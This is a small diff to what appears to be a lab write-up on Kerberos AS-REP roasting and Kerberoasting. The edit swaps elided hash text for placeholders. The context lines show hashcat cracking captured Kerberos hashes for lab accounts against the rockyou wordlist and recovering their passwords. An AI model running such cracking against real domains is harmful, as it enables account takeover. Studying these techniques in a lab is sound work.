@@ -153,8 +153,8 @@ $krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe4
 └─# time hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ⋮
-$krb5asrep$23$mike@LAB.VX:…:P@ssw0rd
-$krb5asrep$23$luke@LAB.VX:…:P@ssw0rd
+$krb5asrep$23$mike@LAB.VX:<hash-truncated>:P@ssw0rd
+$krb5asrep$23$luke@LAB.VX:<hash-truncated>:P@ssw0rd
 
 Session..........: hashcat
 Status...........: Cracked
@@ -636,7 +636,7 @@ It doesn't matter that `rockyou.txt` has 14 million records, the time taken by h
 └─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ⋮
-$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*…:P@ssw0rd
+$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*<hash-truncated>:P@ssw0rd
 
 Session..........: hashcat
 Status...........: Cracked
